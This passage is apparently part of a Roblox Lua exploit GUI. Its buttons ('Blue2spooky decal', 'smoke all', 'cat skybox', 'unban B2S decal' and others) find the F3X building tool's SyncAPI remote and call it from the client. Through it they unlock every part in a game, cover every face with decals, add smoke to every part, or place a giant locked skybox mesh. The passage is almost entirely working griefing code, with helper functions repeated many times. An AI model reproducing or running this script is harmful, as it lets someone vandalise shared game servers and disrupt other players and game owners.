		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("120399026975934")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.39, 1, 0.31, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "Blue2spooky decal"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("120399026975934")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.58, 1, 0.31, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "smoke all"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local function applyDecorationToPart(part)
		local argsCreate = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Smoke"
				}
			}
		}

		local argsSync = {
			[1] = "SyncDecorate",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Smoke",
					["Size"] = 20
				}
			}
		}

		local buildingTools = nil
		local player = game:GetService("Players").LocalPlayer

		-- Search for the tool in Character and Backpack
		for _, item in pairs(player.Character:GetChildren()) do
			if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
				buildingTools = item
				break
			end
		end

		if not buildingTools then
			for _, item in pairs(player.Backpack:GetChildren()) do
				if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
					buildingTools = item
					break
				end
			end
		end

		if buildingTools then
			buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsCreate))
			buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsSync))
		elseif not warned then
			warn("Building tool not found inside player's inventory or backpack!")
			warned = true
		end
	end

	local function applyDecorationToAllParts(workspaceObject)
		for _, obj in pairs(workspaceObject:GetDescendants()) do
			if obj:IsA("Part") or obj:IsA("MeshPart") then
				applyDecorationToPart(obj)
			end
		end
	end

	applyDecorationToAllParts(workspace)
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.77, 1, 0.31, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "meh irl spam"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("92730331106137")
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("92730331106137")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.01, 1, 0.38, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "unban B2S skybox"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("126584088283413")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.20, 1, 0.38, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "unban B2S decal"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("126584088283413")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.39, 1, 0.38, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "cat skybox"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
